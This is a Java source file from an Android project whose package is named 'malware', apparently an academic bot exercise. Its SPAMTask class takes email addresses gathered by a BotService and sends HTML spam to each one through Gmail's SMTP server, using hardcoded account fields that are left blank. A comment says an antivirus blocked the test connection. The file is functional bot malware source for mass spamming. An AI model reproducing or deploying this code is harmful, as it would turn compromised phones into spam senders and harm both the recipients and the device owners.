package es.uc3m.malware.task;


import android.os.StrictMode;
import android.util.Log;
import es.uc3m.malware.BotService;
import org.apache.commons.mail.HtmlEmail;

import java.util.ArrayList;
import javax.mail.internet.InternetAddress;

/**
 * in this task is where the SPAM attack is performed
 * NOTE: when I tried to test this attack the connection to the smpt server was
 *       blocked by the Avast antivirus
 */
public class SPAMTask implements Runnable {

    public static final String EMAIL_FROM = "";
    public static final String ACCOUNT = "";
    public static final String PASSWORD = "";
    String htmlEmail;
    String subject;

    public SPAMTask(String htmlEmail, String subject) {
        this.htmlEmail = htmlEmail;
        this.subject = subject;
    }

    /**
     * this method check the access to the network
     * @return true if none exception happens
     */
    public boolean isNetworkAvailable() {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        return true;
    }

    @Override
    public void run() {
        if (isNetworkAvailable()) {
            // get the mail address
            ArrayList<String> emails = new ArrayList<>(BotService.getEmails());
            for (String emailAddr : emails) {
                try {
                    // for each address send a new mail
                    HtmlEmail email = new HtmlEmail();
                    email.setContent(htmlEmail, "text/html; charset=UTF-8");
                    ArrayList<InternetAddress> to = new ArrayList<>();
                    to.add(InternetAddress.parse(emailAddr)[0]);
                    email.setTo(to);
                    email.setFrom(EMAIL_FROM);
                    // this configuration is setted to send mails using gmail service
                    email.setHostName("smtp.gmail.com");
                    email.setSmtpPort(587);
                    email.setAuthentication(ACCOUNT, PASSWORD);
                    email.setTLS(true);
                    email.send();
                } catch (Exception e) {
                    e.printStackTrace();
                    Log.w(BotService.LOG_TAG, "", e);
                }
            }
        }
    }

}
